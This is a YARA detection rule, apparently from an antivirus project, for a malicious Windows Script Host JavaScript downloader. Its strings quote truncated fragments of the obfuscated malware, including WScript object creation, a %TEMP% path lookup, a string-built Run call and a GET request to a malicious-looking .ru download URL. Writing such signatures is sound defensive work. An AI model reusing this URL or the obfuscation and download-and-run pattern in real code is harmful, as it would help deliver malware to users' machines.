rule sig_20160428_a1ea21fcdeac9302dd487f8368ab2b65 {
  meta:
    description = "datamaliciousorder - file 20160428_a1ea21fcdeac9302dd487f8368ab2b65.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "16c03a78317843b1829b6ba3593d4ad7fba5448e14741325bab3de7c21ccd4e8"

  strings:
    $s1  = "function IkfUbsVdxZveUbgVesAxp(UajHnoUcsIinJzdJnnEec){MrzBxqWfjOtrOyuWfkLzq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function GmuGvfZvpBoqIogNmgVko() {return MrzBxqWfjOtrOyuWfkLzq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function IkfUbsVdxZveUbgVesAxp(UajHnoUcsIinJzdJnnEec){MrzBxqWfjOtrOyuWfkLzq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function NdjHwzHtuFqoTdqZhdNad(RubUzdHczOucZdgHgpEkl, SgfTjoWukDaxVobTfiVzk){NqvHnaSuzSdlFzkOawIiz = NqvHnaSuzSdlFzkOawIiz * 1; " ascii
    $s5  = "var MrzBxqWfjOtrOyuWfkLzq = function YjfJqnUfeAjgIffHdgDtx() {return FbeInxPokMxySfaTouGsd[SglWncPxbYmjMeyKyzMkc](\"WScript\"+\"" ascii
    $s6  = "return RubUzdHczOucZdgHgpEkl - SgfTjoWukDaxVobTfiVzk;};" fullword ascii
    $s7  = "GysQlfSqrAzbJfaZfvFyb[EfwPzjOeeSnqEfpCrjRvx](\"G\" + \"ET\", \"http://3dphoto-rotate.ru/h4ydjs\", false);" fullword ascii
    $s8  = "var MrzBxqWfjOtrOyuWfkLzq = function YjfJqnUfeAjgIffHdgDtx() {return FbeInxPokMxySfaTouGsd[SglWncPxbYmjMeyKyzMkc](\"WScript\"+\"" ascii
    $s9  = "var FbeInxPokMxySfaTouGsd = this[\"WScript\"];" fullword ascii
    $s10 = "function GmuGvfZvpBoqIogNmgVko() {return MrzBxqWfjOtrOyuWfkLzq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (GysQlfSqrAzbJfaZfvFyb[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function NdjHwzHtuFqoTdqZhdNad(RubUzdHczOucZdgHgpEkl, SgfTjoWukDaxVobTfiVzk){NqvHnaSuzSdlFzkOawIiz = NqvHnaSuzSdlFzkOawIiz * 1; " ascii
    $s13 = "function HilJygKblQhtBbvSmwDnl(){return PnbOodCuxBsbUxyOjyJjv + \"\";};" fullword ascii
    $s14 = "function UdzKmlHsrKlbPdfHanGba() {return ((AykQrmHpxJctYuhVbxHng == true) && (AykQrmHpxJctYuhVbxHng == VzdKrhJdjUjbTjrVwnEdv)) ?" ascii
    $s15 = "function UdzKmlHsrKlbPdfHanGba() {return ((AykQrmHpxJctYuhVbxHng == true) && (AykQrmHpxJctYuhVbxHng == VzdKrhJdjUjbTjrVwnEdv)) ?" ascii
    $s16 = "function UlzBvxRubEfdGoxJirCah(RrcVaqMgiBebHuuWbcPbu) {var VvwUtjEzwTxwOklCblYkh = (1, 2, 3, 4, 5, RrcVaqMgiBebHuuWbcPbu); retur" ascii
    $s17 = "function UlzBvxRubEfdGoxJirCah(RrcVaqMgiBebHuuWbcPbu) {var VvwUtjEzwTxwOklCblYkh = (1, 2, 3, 4, 5, RrcVaqMgiBebHuuWbcPbu); retur" ascii
    $s18 = "var VvhNkfDmaIrmQasUmnIge = false;" fullword ascii
    $s19 = "}while (CrjBtsWzmTouTtmQplSdt);" fullword ascii
    $s20 = "function NruJcmPliFgcTupCzbQxh(){return SglWncPxbYmjMeyKyzMkc;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}